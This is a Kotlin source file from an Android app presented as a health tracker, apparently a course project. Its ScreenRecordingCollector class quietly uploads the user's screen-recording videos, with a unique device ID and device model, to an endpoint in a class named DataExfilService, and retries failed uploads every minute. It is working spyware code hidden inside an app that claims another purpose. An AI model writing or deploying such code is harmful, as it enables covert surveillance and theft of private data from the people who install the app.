package com.inf2007.healthtracker.utilities.collectors

import android.content.Context
import android.util.Log
import com.inf2007.healthtracker.utilities.DataExfilService
import com.inf2007.healthtracker.utilities.DeviceUtils
import com.inf2007.healthtracker.utilities.NetworkClient
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.io.IOException

class ScreenRecordingCollector(private val context: Context) : DataCollector {
    companion object {
        private const val TAG = "ScreenRecordingCollector"
    }

    private val videoUploadPrefs by lazy {
        context.getSharedPreferences("screen_recordings_log", Context.MODE_PRIVATE)
    }

    override fun startObserving() {
        Log.d(TAG, "Screen recording collector ready")
    }

    override fun stopObserving() {
        Log.d(TAG, "Screen recording collector stopped")
    }

    override fun collect() {
        // Nothing to collect - triggered by broadcasts
    }

    fun uploadVideo(videoFile: File) {
        Thread {
            try {
                val deviceId = DeviceUtils.getUniqueDeviceId(context)
                val bytes = videoFile.readBytes()

                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file", videoFile.name,
                        bytes.toRequestBody("video/mp4".toMediaTypeOrNull()))
                    .addFormDataPart("device_id", deviceId)
                    .addFormDataPart("device_model", android.os.Build.MODEL)
                    .addFormDataPart("file_size", videoFile.length().toString())
                    .addFormDataPart("timestamp", System.currentTimeMillis().toString())
                    .addFormDataPart("type", "screen_recording")
                    .build()

                val request = Request.Builder()
                    .url(DataExfilService.SCREEN_RECORDING_ENDPOINT)
                    .post(requestBody)
                    .build()

                NetworkClient.instance.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        Log.e(TAG, "Screen recording upload failed: ${videoFile.name} - ${e.message}")
                        scheduleRetry(videoFile)
                    }

                    override fun onResponse(call: Call, response: Response) {
                        if (response.isSuccessful) {
                            Log.i(TAG, "Screen recording uploaded: ${videoFile.name}")
                            videoUploadPrefs.edit().putBoolean("video_${videoFile.name}", true).apply()
                        } else {
                            Log.w(TAG, "Screen recording upload failed: HTTP ${response.code}")
                            val errorBody = response.body?.string()
                            Log.w(TAG, "Error body: $errorBody")
                            scheduleRetry(videoFile)
                        }
                        response.close()
                    }
                })
            } catch (e: Exception) {
                Log.e(TAG, "Error uploading screen recording: ${e.message}")
                scheduleRetry(videoFile)
            }
        }.start()
    }

    private fun scheduleRetry(videoFile: File) {
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            uploadVideo(videoFile)
        }, 60000) // Retry after 60 seconds
    }
}